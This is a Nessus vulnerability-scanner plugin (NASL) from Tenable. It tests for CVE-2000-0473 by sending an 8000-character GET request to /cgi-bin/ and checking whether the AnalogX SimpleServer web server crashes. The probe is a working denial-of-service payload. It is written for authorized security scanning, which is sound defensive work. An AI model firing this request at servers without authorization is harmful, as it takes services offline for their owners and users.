#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10445);
 script_version("$Revision: 1.30 $");
 script_cvs_date("$Date: 2012/04/22 23:42:39 $");

 script_cve_id("CVE-2000-0473");
 script_bugtraq_id(1349);
 script_osvdb_id(346);

 script_name(english:"AnalogX SimpleServer:WWW /cgi-bin/ Long GET Request DoS");
 script_summary(english:"Crash the remote HTTP service");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by a remote denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"It is possible to crash the remote web server by a long URL in the
/cgi-bin directory.  AnalogX SimpleServer is known to be affected by
this flaw." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to SimpleServer 1.06 or later.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");

 script_set_attribute(attribute:"vuln_publication_date", value:"2000/07/15");
 script_set_attribute(attribute:"plugin_publication_date", value:"2000/06/22");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:analogx:simpleserver_www");
 script_end_attributes();
 
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2000-2012 Tenable Network Security, Inc.");
 script_family(english:"Web Servers");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


#
# Here we go
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

if (http_is_dead(port: port))
 exit(1, "The web server on port "+port+" is dead.");

r = http_send_recv3(method:"GET", port:port, item:string("/cgi-bin/", crap(8000)), exit_on_fail: 0);

if (! http_is_dead(port: port, retry: 3))
 exit(0, "The web server on port "+port+" is still alive.");

if ( report_paranoia >= 2 ||
     service_is_dead(port: port) > 0)
  security_hole(port);
